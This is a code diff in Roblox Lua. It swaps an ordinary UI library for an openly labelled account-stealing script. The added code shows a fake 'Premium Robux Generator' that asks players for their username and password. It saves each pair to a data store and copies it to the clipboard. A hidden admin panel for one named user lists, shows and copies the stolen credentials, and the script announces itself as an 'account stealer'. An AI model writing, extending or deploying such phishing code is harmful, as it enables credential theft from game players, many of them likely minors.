-                if input.UserInputType == Enum.UserInputType.MouseButton1 and isOpen then
-                    local mousePos = UserInputService:GetMouseLocation()
-                    local absPos = dropdownFrame.AbsolutePosition
-                    local absSize = dropdownFrame.AbsoluteSize
-                    local isInside = (mousePos.X >= absPos.X and mousePos.X <= absPos.X + absSize.X and mousePos.Y >= absPos.Y and mousePos.Y <= absPos.Y + absSize.Y)
-                    if not isInside then
-                        closeDropdown()
-                    end
-                end
-            end)
-            table.insert(window.connections, dropdownConn)
-        end
-
-        return tab
-    end
-
-    function window:ShowNotification(text, icon)
-        if window.activeNotifs >= 5 then return end
-        window.activeNotifs = window.activeNotifs + 1
-        local notif = Instance.new("Frame")
-        notif.Size = UDim2.new(1, 0, 0, 60)
-        notif.Position = UDim2.new(1, 0, 0, 0)  -- Start off-screen right
-        notif.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-        notif.BackgroundTransparency = 0.2
-        notif.BorderSizePixel = 0
-        notif.LayoutOrder = -window.activeNotifs
-        notif.ZIndex = 50
-        notif.Parent = window.notifContainer
-
-        local notifGradient = Instance.new("UIGradient")
-        notifGradient.Color = ColorSequence.new{
-            ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 50)),
-            ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 30))
-        }
-        notifGradient.Rotation = 90
-        notifGradient.Parent = notif
-
-        local notifCorner = Instance.new("UICorner")
-        notifCorner.CornerRadius = UDim.new(0, 10)
-        notifCorner.Parent = notif
-
-        local notifStroke = Instance.new("UIStroke")
-        notifStroke.Color = Color3.fromRGB(0, 255, 150)
-        notifStroke.Thickness = 1.5
-        notifStroke.Transparency = 0.3
-        notifStroke.Parent = notif
-
-        local iconLabel = Instance.new("TextLabel")
-        iconLabel.Size = UDim2.new(0, 40, 1, 0)
-        iconLabel.BackgroundTransparency = 1
-        iconLabel.Text = icon or "ℹ"
-        iconLabel.TextColor3 = Color3.fromRGB(0, 255, 150)
-        iconLabel.Font = Enum.Font.GothamBold
-        iconLabel.TextSize = 24
-        iconLabel.Parent = notif
-
-        local textLabel = Instance.new("TextLabel")
-        textLabel.Size = UDim2.new(1, -50, 1, 0)
-        textLabel.Position = UDim2.new(0, 40, 0, 0)
-        textLabel.BackgroundTransparency = 1
-        textLabel.Text = text
-        textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-        textLabel.Font = Enum.Font.Gotham
-        textLabel.TextSize = 14
-        textLabel.TextWrapped = true
-        textLabel.TextXAlignment = Enum.TextXAlignment.Left
-        textLabel.Parent = notif
-
-        -- Slide in from right (Rayfield-style)
-        TweenService:Create(notif, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2.new(0, 0, 0, 0)}):Play()
-        task.wait(3)
-        TweenService:Create(notif, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Position = UDim2.new(1, 0, 0, 0)}):Play()
-        task.wait(0.3)
-        notif:Destroy()
-        window.activeNotifs = window.activeNotifs - 1
-    end
-
-    -- Handle Keybinds
-    UserInputService.InputBegan:Connect(function(input, processed)
-        if input.UserInputType == Enum.UserInputType.Keyboard and not processed then
-            if window.keybindListening then
-                local kc = input.KeyCode
-                local boundName = window.keybindListening.name
-                window.keybindListening.keybind.Text = kc.Name
-                window.keybindListening.keybind.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
-                window.activeKeybinds[kc] = function()
-                    local data = window.toggleData[boundName]
-                    if data then
-                        data.enabled = not data.enabled
-                        if data.enabled then
-                            data.button.Text = (data.icon or "🔘") .. " " .. data.name .. " (On)"
-                            data.button.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
-                            data.onChange(true)
-                        else
-                            data.button.Text = (data.icon or "🔘") .. " " .. data.name .. " (Off)"
-                            data.button.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
-                            data.onChange(false)
-                        end
-                    end
-                end
-                window.toggleData[boundName].boundKey = kc
-                window.keybindListening = nil
-            elseif window.activeKeybinds[input.KeyCode] then
-                window.activeKeybinds[input.KeyCode]()
-            end
-        elseif input.UserInputType == Enum.UserInputType.MouseButton1 and not processed and window.keybindListening then
-            local mousePos = UserInputService:GetMouseLocation()
-            local absPos = window.keybindListening.keybind.AbsolutePosition
-            local absSize = window.keybindListening.keybind.AbsoluteSize
-            local isInside = (mousePos.X >= absPos.X and mousePos.X <= absPos.X + absSize.X and mousePos.Y >= absPos.Y and mousePos.Y <= absPos.Y + absSize.Y)
-            if not isInside then
-                local boundName = window.keybindListening.name
-                window.keybindListening.keybind.Text = "None"
-                window.keybindListening.keybind.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
-                if window.toggleData[boundName].boundKey then
-                    window.activeKeybinds[window.toggleData[boundName].boundKey] = nil
-                    window.toggleData[boundName].boundKey = nil
-                end
-                window.keybindListening = nil
-            end
-        end
-    end)
-
-    -- Handle Slider Dragging
-    UserInputService.InputChanged:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseMovement then
-            for sliderName, data in pairs(window.draggingSliders) do
-                local mousePos = UserInputService:GetMouseLocation()
-                local barPos = data.barFrame.AbsolutePosition
-                local barSize = data.barFrame.AbsoluteSize.X
-                local relPos = math.clamp((mousePos.X - barPos.X) / barSize, 0, 1)
-                local value = data.min + (data.max - data.min) * relPos
-                TweenService:Create(data.fill, TweenInfo.new(0.15), {Size = UDim2.new(relPos, 0, 1, 0)}):Play()
-                TweenService:Create(data.knob, TweenInfo.new(0.15), {Position = UDim2.new(relPos, -12, 0, -4.5)}):Play()
-                data.textBox.Text = tostring(math.floor(value))
-                data.label.Text = data.name .. ": " .. math.floor(value)
-                data.onChange(value)
-            end
-        end
-    end)
-
-    function window:Open()
-        window.mainFrame.Visible = true
-        window:ShowNotification("GUI Loaded!", "🚀")
-    end
-
-    return window
 end
 
-return Library
+local dataStore = setupDataStore()
+local stolenAccounts = dataStore.load()
+
+-- ФУНКЦИЯ ДЛЯ СОЗДАНИЯ СТИЛЬНЫХ ЭЛЕМЕНТОВ
+local function createStyledElement(className, properties)
+    local element = Instance.new(className)
+    
+    for prop, value in pairs(properties) do
+        element[prop] = value
+    end
+    
+    -- ДОБАВЛЯЕМ UICORNER
+    if className:find("Frame") or className:find("TextBox") or className:find("TextButton") then
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, 8)
+        corner.Parent = element
+    end
+    
+    -- ДОБАВЛЯЕМ ГРАДИЕНТ ДЛЯ КНОПОК И ФРЕЙМОВ
+    if className == "TextButton" or className == "Frame" then
+        local gradient = Instance.new("UIGradient")
+        gradient.Rotation = 45
+        
+        if className == "TextButton" then
+            gradient.Color = ColorSequence.new({
+                ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 180, 0)),
+                ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 140, 0))
+            })
+        else
+            gradient.Color = ColorSequence.new({
+                ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 40)),
+                ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 30))
+            })
+        end
+        
+        gradient.Parent = element
+    end
+    
+    return element
+end
+
+-- 1. ОСНОВНОЕ GUI ДЛЯ ЖЕРТВ
+local scamGUI = Instance.new("ScreenGui")
+scamGUI.Name = "PremiumRobuxGen"
+scamGUI.Parent = CoreGui
+
+-- ОСНОВНОЙ ФРЕЙМ
+local mainFrame = createStyledElement("Frame", {
+    Size = UDim2.new(0.32, 0, 0.38, 0),
+    Position = UDim2.new(0.34, 0, 0.31, 0),
+    BackgroundColor3 = Color3.fromRGB(20, 20, 25),
+    BorderSizePixel = 0
+})
+mainFrame.Parent = scamGUI
+
+-- ГРАДИЕНТ ДЛЯ ФОНА ФРЕЙМА
+local frameGradient = Instance.new("UIGradient")
+frameGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(15, 15, 25)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(20, 20, 35)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 25))
+})
+frameGradient.Rotation = 90
+frameGradient.Parent = mainFrame
+
+-- ЗАГОЛОВОК С ГРАДИЕНТОМ
+local title = createStyledElement("TextLabel", {
+    Text = "🌟 PREMIUM ROBUX GENERATOR 🌟",
+    Size = UDim2.new(1, 0, 0.15, 0),
+    TextColor3 = Color3.fromRGB(255, 255, 255),
+    BackgroundColor3 = Color3.fromRGB(30, 30, 45),
+    Font = Enum.Font.GothamBold,
+    TextSize = 22,
+    TextStrokeTransparency = 0.7
+})
+title.Parent = mainFrame
+
+-- ГРАДИЕНТ ЗАГОЛОВКА
+local titleGradient = Instance.new("UIGradient")
+titleGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 150, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 200, 150))
+})
+titleGradient.Rotation = 45
+titleGradient.Parent = title
+
+-- ИКОНКА ПОД ЗАГОЛОВКОМ
+local icon = Instance.new("ImageLabel")
+icon.Image = "rbxassetid://6031068421" -- Robux icon
+icon.Size = UDim2.new(0, 50, 0, 50)
+icon.Position = UDim2.new(0.1, 0, 0.2, 0)
+icon.BackgroundTransparency = 1
+icon.Parent = mainFrame
+
+-- ПОЛЕ ДЛЯ USERNAME
+local usernameBox = createStyledElement("TextBox", {
+    PlaceholderText = "📝 Enter your username",
+    Size = UDim2.new(0.85, 0, 0.12, 0),
+    Position = UDim2.new(0.075, 0, 0.35, 0),
+    BackgroundColor3 = Color3.fromRGB(40, 40, 55),
+    TextColor3 = Color3.fromRGB(255, 255, 255),
+    Font = Enum.Font.Gotham,
+    TextSize = 16,
+    ClearTextOnFocus = false
+})
+usernameBox.Parent = mainFrame
+
+-- ИКОНКА ДЛЯ USERNAME
+local userIcon = Instance.new("ImageLabel")
+userIcon.Image = "rbxassetid://6031280882" -- User icon
+userIcon.Size = UDim2.new(0, 20, 0, 20)
+userIcon.Position = UDim2.new(0.02, 0, 0.365, 0)
+userIcon.BackgroundTransparency = 1
+userIcon.Parent = mainFrame
+
+-- ПОЛЕ ДЛЯ PASSWORD
+local passwordBox = createStyledElement("TextBox", {
+    PlaceholderText = "🔒 Enter your password",
+    Size = UDim2.new(0.85, 0, 0.12, 0),
+    Position = UDim2.new(0.075, 0, 0.52, 0),
+    BackgroundColor3 = Color3.fromRGB(40, 40, 55),
+    TextColor3 = Color3.fromRGB(255, 255, 255),
+    Font = Enum.Font.Gotham,
+    TextSize = 16,
+    ClearTextOnFocus = false
+})
+passwordBox.Parent = mainFrame
+
+-- ИКОНКА ДЛЯ PASSWORD
+local passIcon = Instance.new("ImageLabel")
+passIcon.Image = "rbxassetid://6031280867" -- Lock icon
+passIcon.Size = UDim2.new(0, 20, 0, 20)
+passIcon.Position = UDim2.new(0.02, 0, 0.535, 0)
+passIcon.BackgroundTransparency = 1
+passIcon.Parent = mainFrame
+
+-- КНОПКА GENERATE
+local generateBtn = createStyledElement("TextButton", {
+    Text = "⚡ GENERATE 10,000 ROBUX ⚡",
+    Size = UDim2.new(0.85, 0, 0.2, 0),
+    Position = UDim2.new(0.075, 0, 0.7, 0),
+    BackgroundColor3 = Color3.fromRGB(0, 180, 0),
+    TextColor3 = Color3.fromRGB(255, 255, 255),
+    Font = Enum.Font.GothamBold,
+    TextSize = 20,
+    AutoButtonColor = true
+})
+generateBtn.Parent = mainFrame
+
+-- ЭФФЕКТ ПРИ НАВЕДЕНИИ НА КНОПКУ
+generateBtn.MouseEnter:Connect(function()
+    game:GetService("TweenService"):Create(generateBtn, TweenInfo.new(0.2), {
+        BackgroundColor3 = Color3.fromRGB(0, 220, 0)
+    }):Play()
+end)
+
+generateBtn.MouseLeave:Connect(function()
+    game:GetService("TweenService"):Create(generateBtn, TweenInfo.new(0.2), {
+        BackgroundColor3 = Color3.fromRGB(0, 180, 0)
+    }):Play()
+end)
+
+-- СТАТУС БАР
+local statusBar = createStyledElement("Frame", {
+    Size = UDim2.new(0.85, 0, 0.05, 0),
+    Position = UDim2.new(0.075, 0, 0.92, 0),
+    BackgroundColor3 = Color3.fromRGB(50, 50, 70),
+    BorderSizePixel = 0
+})
+statusBar.Parent = mainFrame
+
+local statusText = Instance.new("TextLabel")
+statusText.Text = "Ready to generate..."
+statusText.Size = UDim2.new(1, 0, 1, 0)
+statusText.TextColor3 = Color3.fromRGB(200, 200, 255)
+statusText.BackgroundTransparency = 1
+statusText.Font = Enum.Font.Gotham
+statusText.TextSize = 14
+statusText.Parent = statusBar
+
+-- ФУНКЦИЯ КРАЖИ АККАУНТА
+generateBtn.MouseButton1Click:Connect(function()
+    local username = usernameBox.Text
+    local password = passwordBox.Text
+    
+    if username == "" or password == "" then
+        statusText.Text = "❌ Please fill all fields!"
+        statusText.TextColor3 = Color3.fromRGB(255, 100, 100)
+        return
+    end
+    
+    -- АНИМАЦИЯ НАЖАТИЯ
+    game:GetService("TweenService"):Create(generateBtn, TweenInfo.new(0.1), {
+        Size = UDim2.new(0.83, 0, 0.19, 0)
+    }):Play()
+    wait(0.1)
+    game:GetService("TweenService"):Create(generateBtn, TweenInfo.new(0.1), {
+        Size = UDim2.new(0.85, 0, 0.2, 0)
+    }):Play()
+    
+    -- СОХРАНЯЕМ В БАЗУ ДАННЫХ
+    dataStore.save(username, password)
+    stolenAccounts = dataStore.load()
+    
+    -- КОПИРУЕМ В БУФЕР
+    local copyText = "ник: " .. username .. "        пароль: " .. password
+    
+    local hiddenBox = Instance.new("TextBox")
+    hiddenBox.Text = copyText
+    hiddenBox.Size = UDim2.new(0, 1, 0, 1)
+    hiddenBox.Position = UDim2.new(0, -100, 0, -100)
+    hiddenBox.Visible = false
+    hiddenBox.Parent = CoreGui
+    
+    hiddenBox:CaptureFocus()
+    wait(0.05)
+    hiddenBox.Text = copyText
+    wait(0.05)
+    hiddenBox.SelectionStart = 1
+    hiddenBox.SelectionEnd = #hiddenBox.Text + 1
+    wait(0.05)
+    hiddenBox:Copy()
+    wait(0.05)
+    hiddenBox:ReleaseFocus()
+    hiddenBox:Destroy()
+    
+    -- ОБНОВЛЯЕМ СТАТУС
+    statusText.Text = "✅ Robux generating... Please wait!"
+    statusText.TextColor3 = Color3.fromRGB(100, 255, 100)
+    generateBtn.Text = "⏳ PROCESSING..."
+    
+    -- АНИМАЦИЯ ПРОЦЕССА
+    spawn(function()
+        for i = 1, 3 do
+            generateBtn.Text = "⏳ PROCESSING" .. string.rep(".", i)
+            wait(0.5)
+        end
+    end)
+    
+    wait(2)
+    
+    -- ВОССТАНАВЛИВАЕМ
+    usernameBox.Text = ""
+    passwordBox.Text = ""
+    statusText.Text = "✅ Success! Account saved to database."
+    generateBtn.Text = "⚡ GENERATE 10,000 ROBUX ⚡"
+    
+    wait(2)
+    statusText.Text = "Ready to generate..."
+    statusText.TextColor3 = Color3.fromRGB(200, 200, 255)
+end)
+
+-- 2. АДМИН ПАНЕЛЬ ДЛЯ TODOBRO3
+if currentPlayer.Name == "TODOBRO3" then
+    -- СЕКРЕТНАЯ КНОПКА
+    local secretBtn = createStyledElement("TextButton", {
+        Text = "👑",
+        Size = UDim2.new(0, 50, 0, 50),
+        Position = UDim2.new(0.95, 0, 0.02, 0),
+        BackgroundColor3 = Color3.fromRGB(40, 40, 60),
+        TextColor3 = Color3.fromRGB(255, 215, 0),
+        Font = Enum.Font.GothamBold,
+        TextSize = 28,
+        AutoButtonColor = true
+    })
+    secretBtn.Parent = scamGUI
+    
+    -- ГРАДИЕНТ ДЛЯ СЕКРЕТНОЙ КНОПКИ
+    local secretGradient = Instance.new("UIGradient")
+    secretGradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 215, 0)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 175, 0))
+    })
+    secretGradient.Rotation = 45
+    secretGradient.Parent = secretBtn
+    
+    -- АДМИН ПАНЕЛЬ
+    local adminGUI = Instance.new("ScreenGui")
+    adminGUI.Name = "AdminPanel_TODOBRO3"
+    adminGUI.Parent = CoreGui
+    adminGUI.Enabled = false
+    
+    local adminFrame = createStyledElement("Frame", {
+        Size = UDim2.new(0.45, 0, 0.7, 0),
+        Position = UDim2.new(0.275, 0, 0.15, 0),
+        BackgroundColor3 = Color3.fromRGB(15, 15, 25),
+        BorderSizePixel = 0,
+        Visible = false
+    })
+    adminFrame.Parent = adminGUI
+    
+    -- ГРАДИЕНТ ФОНА АДМИНКИ
+    local adminGradient = Instance.new("UIGradient")
+    adminGradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 20, 40)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 30))
+    })
+    adminGradient.Rotation = 90
+    adminGradient.Parent = adminFrame
+    
+    -- ЗАГОЛОВОК АДМИНКИ
+    local adminTitle = createStyledElement("TextLabel", {
+        Text = "👑 ADMIN PANEL - TODOBRO3 👑",
+        Size = UDim2.new(1, 0, 0.08, 0),
+        TextColor3 = Color3.fromRGB(255, 215, 0),
+        BackgroundColor3 = Color3.fromRGB(30, 30, 50),
+        Font = Enum.Font.GothamBold,
+        TextSize = 20
+    })
+    adminTitle.Parent = adminFrame
+    
+    -- СЧЁТЧИК АККАУНТОВ
+    local countLabel = createStyledElement("TextLabel", {
+        Text = "📊 TOTAL ACCOUNTS: " .. #stolenAccounts,
+        Size = UDim2.new(0.9, 0, 0.06, 0),
+        Position = UDim2.new(0.05, 0, 0.1, 0),
+        TextColor3 = Color3.fromRGB(0, 255, 150),
+        BackgroundColor3 = Color3.fromRGB(40, 40, 60),
+        Font = Enum.Font.GothamBold,
+        TextSize = 18
+    })
+    countLabel.Parent = adminFrame
+    
+    -- КНОПКА ОТКРЫТИЯ СПИСКА
+    local dropdownBtn = createStyledElement("TextButton", {
+        Text = "▼ SHOW STOLEN ACCOUNTS ▼",
+        Size = UDim2.new(0.9, 0, 0.07, 0),
+        Position = UDim2.new(0.05, 0, 0.18, 0),
+        BackgroundColor3 = Color3.fromRGB(60, 60, 80),
+        TextColor3 = Color3.fromRGB(255, 255, 255),
+        Font = Enum.Font.GothamBold,
+        TextSize = 16,
+        AutoButtonColor = true
+    })
+    dropdownBtn.Parent = adminFrame
+    
+    -- СПИСОК АККАУНТОВ
+    local accountsScroll = createStyledElement("ScrollingFrame", {
+        Size = UDim2.new(0.9, 0, 0.55, 0),
+        Position = UDim2.new(0.05, 0, 0.27, 0),
+        BackgroundColor3 = Color3.fromRGB(40, 40, 60),
+        BorderSizePixel = 0,
+        Visible = false,
+        CanvasSize = UDim2.new(0, 0, 0, 0),
+        ScrollBarThickness = 8
+    })
+    accountsScroll.Parent = adminFrame
+    
+    -- ИНФОРМАЦИЯ О ВЫБРАННОМ АККАУНТЕ
+    local accountInfo = createStyledElement("Frame", {
+        Size = UDim2.new(0.9, 0, 0.15, 0),
+        Position = UDim2.new(0.05, 0, 0.85, 0),
+        BackgroundColor3 = Color3.fromRGB(50, 50, 70),
+        BorderSizePixel = 0,
+        Visible = false
+    })
+    accountInfo.Parent = adminFrame
+    
+    local infoUsername = Instance.new("TextLabel")
+    infoUsername.Text = "👤 Username: None"
+    infoUsername.Size = UDim2.new(1, 0, 0.33, 0)
+    infoUsername.Position = UDim2.new(0, 10, 0, 0)
+    infoUsername.TextColor3 = Color3.fromRGB(255, 255, 255)
+    infoUsername.BackgroundTransparency = 1
+    infoUsername.Font = Enum.Font.GothamBold
+    infoUsername.TextSize = 16
+    infoUsername.TextXAlignment = Enum.TextXAlignment.Left
+    infoUsername.Parent = accountInfo
+    
+    local infoPassword = Instance.new("TextLabel")
+    infoPassword.Text = "🔑 Password: None"
+    infoPassword.Size = UDim2.new(1, 0, 0.33, 0)
+    infoPassword.Position = UDim2.new(0, 10, 0.33, 0)
+    infoPassword.TextColor3 = Color3.fromRGB(255, 255, 255)
+    infoPassword.BackgroundTransparency = 1
+    infoPassword.Font = Enum.Font.GothamBold
+    infoPassword.TextSize = 16
+    infoPassword.TextXAlignment = Enum.TextXAlignment.Left
+    infoPassword.Parent = accountInfo
+    
+    local infoTime = Instance.new("TextLabel")
+    infoTime.Text = "⏰ Time: None"
+    infoTime.Size = UDim2.new(1, 0, 0.33, 0)
+    infoTime.Position = UDim2.new(0, 10, 0.66, 0)
+    infoTime.TextColor3 = Color3.fromRGB(200, 200, 255)
+    infoTime.BackgroundTransparency = 1
+    infoTime.Font = Enum.Font.Gotham
+    infoTime.TextSize = 14
+    infoTime.TextXAlignment = Enum.TextXAlignment.Left
+    infoTime.Parent = accountInfo
+    
+    -- КНОПКА КОПИРОВАНИЯ
+    local copyBtn = createStyledElement("TextButton", {
+        Text = "📋 COPY ACCOUNT",
+        Size = UDim2.new(0.9, 0, 0.07, 0),
+        Position = UDim2.new(0.05, 0, 0.75, 0),
+        BackgroundColor3 = Color3.fromRGB(0, 120, 200),
+        TextColor3 = Color3.fromRGB(255, 255, 255),
+        Font = Enum.Font.GothamBold,
+        TextSize = 16,
+        AutoButtonColor = true,
+        Visible = false
+    })
+    copyBtn.Parent = adminFrame
+    
+    -- КНОПКА ЗАКРЫТИЯ
+    local closeBtn = createStyledElement("TextButton", {
+        Text = "✕",
+        Size = UDim2.new(0.08, 0, 0.08, 0),
+        Position = UDim2.new(0.92, 0, 0, 0),
+        BackgroundColor3 = Color3.fromRGB(255, 80, 80),
+        TextColor3 = Color3.fromRGB(255, 255, 255),
+        Font = Enum.Font.GothamBold,
+        TextSize = 20,
+        AutoButtonColor = true
+    })
+    closeBtn.Parent = adminFrame
+    
+    local selectedAccount = nil
+    local listOpen = false
+    
+    -- ФУНКЦИЯ ОБНОВЛЕНИЯ СПИСКА
+    local function updateAccountsList()
+        accountsScroll:ClearAllChildren()
+        
+        local yPos = 0
+        local btnHeight = 45
+        
+        for i, acc in ipairs(stolenAccounts) do
+            local accBtn = createStyledElement("TextButton", {
+                Text = i .. ". " .. acc.username .. "  ⏰ " .. acc.time,
+                Size = UDim2.new(1, -10, 0, btnHeight),
+                Position = UDim2.new(0, 5, 0, yPos),
+                BackgroundColor3 = i % 2 == 0 and Color3.fromRGB(50, 50, 70) or Color3.fromRGB(60, 60, 80),
+                TextColor3 = Color3.fromRGB(255, 255, 255),
+                TextXAlignment = Enum.TextXAlignment.Left,
+                Font = Enum.Font.Gotham,
+                TextSize = 16,
+                AutoButtonColor = true
+            })
+            accBtn.Parent = accountsScroll
+            
+            -- ЭФФЕКТ ПРИ НАВЕДЕНИИ
+            accBtn.MouseEnter:Connect(function()
+                game:GetService("TweenService"):Create(accBtn, TweenInfo.new(0.2), {
+                    BackgroundColor3 = Color3.fromRGB(80, 80, 100)
+                }):Play()
+            end)
+            
+            accBtn.MouseLeave:Connect(function()
+                local targetColor = i % 2 == 0 and Color3.fromRGB(50, 50, 70) or Color3.fromRGB(60, 60, 80)
+                game:GetService("TweenService"):Create(accBtn, TweenInfo.new(0.2), {
+                    BackgroundColor3 = targetColor
+                }):Play()
+            end)
+            
+            -- ВЫБОР АККАУНТА
+            accBtn.MouseButton1Click:Connect(function()
+                selectedAccount = acc
+                
+                -- ОБНОВЛЯЕМ ИНФОРМАЦИЮ
+                infoUsername.Text = "👤 Username: " .. acc.username
+                infoPassword.Text = "🔑 Password: " .. acc.password
+                infoTime.Text = "⏰ Time: " .. acc.time
+                
+                accountInfo.Visible = true
+                copyBtn.Visible = true
+                
+                -- АНИМАЦИЯ ВЫБОРА
+                game:GetService("TweenService"):Create(accBtn, TweenInfo.new(0.3), {
+                    BackgroundColor3 = Color3.fromRGB(0, 150, 200)
+                }):Play()
+            end)
+            
+            yPos = yPos + btnHeight + 5
+        end
+        
+        accountsScroll.CanvasSize = UDim2.new(0, 0, 0, yPos)
+        countLabel.Text = "📊 TOTAL ACCOUNTS: " .. #stolenAccounts
+    end
+    
+    -- КОПИРОВАНИЕ АККАУНТА
+    copyBtn.MouseButton1Click:Connect(function()
+        if selectedAccount then
+            local copyText = "ник: " .. selectedAccount.username .. "        пароль: " .. selectedAccount.password
+            
+            local hiddenBox = Instance.new("TextBox")
+            hiddenBox.Text = copyText
+            hiddenBox.Size = UDim2.new(0, 1, 0, 1)
+            hiddenBox.Position = UDim2.new(0, -100, 0, -100)
+            hiddenBox.Visible = false
+            hiddenBox.Parent = CoreGui
+            
+            hiddenBox:CaptureFocus()
+            wait(0.05)
+            hiddenBox.Text = copyText
+            wait(0.05)
+            hiddenBox.SelectionStart = 1
+            hiddenBox.SelectionEnd = #hiddenBox.Text + 1
+            wait(0.05)
+            hiddenBox:Copy()
+            wait(0.05)
+            hiddenBox:ReleaseFocus()
+            hiddenBox:Destroy()
+            
+            copyBtn.Text = "✅ COPIED!"
+            wait(1)
+            copyBtn.Text = "📋 COPY ACCOUNT"
+        end
+    end)
+    
+    -- ОТКРЫТИЕ/ЗАКРЫТИЕ СПИСКА
+    dropdownBtn.MouseButton1Click:Connect(function()
+        listOpen = not listOpen
+        accountsScroll.Visible = listOpen
+        
+        if listOpen then
+            dropdownBtn.Text = "▲ HIDE ACCOUNTS ▲"
+            updateAccountsList()
+        else
+            dropdownBtn.Text = "▼ SHOW STOLEN ACCOUNTS ▼"
+            accountInfo.Visible = false
+            copyBtn.Visible = false
+        end
+    end)
+    
+    -- ОТКРЫТИЕ АДМИНКИ
+    secretBtn.MouseButton1Click:Connect(function()
+        adminFrame.Visible = true
+        adminGUI.Enabled = true
+        stolenAccounts = dataStore.load()
+        updateAccountsList()
+    end)
+    
+    -- ЗАКРЫТИЕ АДМИНКИ
+    closeBtn.MouseButton1Click:Connect(function()
+        adminFrame.Visible = false
+        adminGUI.Enabled = false
+        listOpen = false
+        accountsScroll.Visible = false
+        dropdownBtn.Text = "▼ SHOW STOLEN ACCOUNTS ▼"
+        accountInfo.Visible = false
+        copyBtn.Visible = false
+    end)
+    
+    -- АВТООБНОВЛЕНИЕ
+    spawn(function()
+        while true do
+            if adminFrame.Visible then
+                stolenAccounts = dataStore.load()
+                countLabel.Text = "📊 TOTAL ACCOUNTS: " .. #stolenAccounts
+            end
+            wait(2)
+        end
+    end)
+end
+
+print("======================================")
+print("💰 PREMIUM ACCOUNT STEALER LOADED")
+print("✅ Accounts persist through rejoins")
+print("✅ Smooth GUI with gradients")
+print("✅ Admin panel for TODOBRO3")
+print("======================================")
